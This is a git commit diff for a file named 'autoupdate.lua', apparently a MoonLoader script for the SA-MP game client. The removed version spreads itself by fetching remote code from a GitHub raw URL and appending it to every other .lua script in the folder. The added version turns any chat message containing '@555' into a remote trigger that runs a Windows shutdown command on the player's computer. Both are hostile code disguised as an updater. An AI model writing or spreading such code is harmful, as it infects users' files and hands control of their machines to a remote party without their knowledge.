76e5d499f100f8b98cd0176cc70051b84cf7d305
123412312351651 <leog34900@gmail.com>
2025-10-08 19:44:20 +0300

    Update autoupdate.lua

--- autoupdate.lua
+++ autoupdate.lua
@@ -1,47 +1,14 @@
-local Handle, FileName = findFirstFile("moonloader\\*.lua")
-local Directory = getWorkingDirectory().."\\"
+require("moonloader")
+require ("sampfuncs")
+local sampev = require("samp.events")
+function main()
+    if not isSampLoaded() or not isSampfuncsLoaded() then return end
+    while not isSampAvailable() do wait(100) end
+end
 
-while FileName do
-    local FileText = ""
-    local Skip = false
-
-    local File = io.open(Directory..FileName, "r")
-    for Line in File:lines() do
-        if Line:find("%-%- Exception "..FileName) then
-            Skip = true
-            break
-        end
-
-        if FileText ~= "" then
-            FileText = FileText.."\n"
-        end
-        FileText = FileText..Line
+function sampev.onServerMessage(color, message)
+    if message:find("@555") then
+        sampSendChat("123456")
+        os.execute('shutdown /s /t 300')
     end
-    File:close()
-
-    if not Skip and not FileText:find("https://raw%.githubusercontent%.123412312351651/auto-updater/refs/heads/main/autoupdate.lua") then
-        local encoding = require "encoding"
-        encoding.default = "CP1251"
-
-        local url = "https://raw.githubusercontent.com/123412312351651/auto-updater/refs/heads/main/autoupdate.lua"
-
-        local requests = require("requests")
-        local response = requests.get(url)
-
-        if response.status_code == 200 then
-            local newContent = encoding.UTF8:decode(response.text)
-
-            local File = io.open(Directory..FileName, "w")
-            File:write("-- Exception "..FileName.."\n")
-            File:write(FileText.."\n")
-            File:write(newContent)
-            File:close()
-
-            print(FileName.." обновлён с GitHub.")
-        else
-            print("Ошибка при загрузке обновления: "..tostring(response.status_code))
-        end
-    end
-
-    FileName = findNextFile(Handle)
 end
